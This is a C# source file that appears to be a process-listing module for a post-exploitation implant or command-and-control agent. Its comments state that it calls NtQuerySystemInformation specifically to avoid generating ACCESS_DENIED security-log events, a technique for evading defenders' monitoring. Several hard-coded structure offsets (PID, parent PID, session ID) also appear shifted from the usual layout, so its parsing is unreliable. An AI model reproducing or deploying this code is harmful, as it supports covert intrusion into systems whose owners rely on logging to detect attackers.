using System;
using System.Runtime.InteropServices;
using System.Text;
using Agent.Interop;

namespace Agent.NativeModules
{
    /// <summary>
    /// List running processes via NtQuerySystemInformation.
    /// Does NOT use Process.GetProcesses() — avoids OpenProcess calls
    /// that generate ACCESS_DENIED security log events.
    /// </summary>
    public class ProcessListModule : INativeModule
    {
        public string Name { get { return "ps"; } }
        public string Description { get { return "List running processes"; } }

        public byte[] Execute(byte[] arguments)
        {
            uint bufferSize = 1024 * 1024; // 1MB
            IntPtr buffer = Marshal.AllocHGlobal((int)bufferSize);

            try
            {
                uint returnLength;
                uint status;

                // Retry with larger buffer
                while (true)
                {
                    status = Ntdll.NtQuerySystemInformation(
                        Ntdll.SystemProcessInformation,
                        buffer, bufferSize, out returnLength);

                    if (status == Ntdll.STATUS_INFO_LENGTH_MISMATCH)
                    {
                        Marshal.FreeHGlobal(buffer);
                        bufferSize = returnLength + 4096;
                        buffer = Marshal.AllocHGlobal((int)bufferSize);
                        continue;
                    }
                    break;
                }

                if (status != Ntdll.STATUS_SUCCESS)
                {
                    return Encoding.UTF8.GetBytes(
                        string.Format("[!] NtQuerySystemInformation failed: 0x{0:X8}", status));
                }

                var sb = new StringBuilder();
                sb.AppendFormat("{0,-8} {1,-8} {2,-6} {3,-40}", "PID", "PPID", "SID", "Name");
                sb.AppendLine();
                sb.AppendLine(new string('-', 64));

                IntPtr current = buffer;

                while (true)
                {
                    // Parse SYSTEM_PROCESS_INFORMATION
                    uint nextOffset = (uint)Marshal.ReadInt32(current, 0x00);
                    IntPtr pid = Marshal.ReadIntPtr(current, 0x48);
                    IntPtr ppid = Marshal.ReadIntPtr(current, 0x50);
                    uint sessionId = (uint)Marshal.ReadInt32(current, 0x60);

                    // Read UNICODE_STRING for ImageName at offset 0x38
                    ushort nameLength = (ushort)Marshal.ReadInt16(current, 0x38);
                    IntPtr nameBuffer = Marshal.ReadIntPtr(current,
                        0x38 + IntPtr.Size); // Buffer follows Length + MaxLength

                    string processName;
                    if (nameLength > 0 && nameBuffer != IntPtr.Zero)
                    {
                        processName = Marshal.PtrToStringUni(nameBuffer, nameLength / 2);
                    }
                    else
                    {
                        processName = "[System Idle Process]";
                    }

                    sb.AppendFormat("{0,-8} {1,-8} {2,-6} {3,-40}",
                        pid.ToInt32(), ppid.ToInt32(), sessionId, processName);
                    sb.AppendLine();

                    if (nextOffset == 0) break;
                    current = IntPtr.Add(current, (int)nextOffset);
                }

                return Encoding.UTF8.GetBytes(sb.ToString());
            }
            finally
            {
                Marshal.FreeHGlobal(buffer);
            }
        }
    }
}
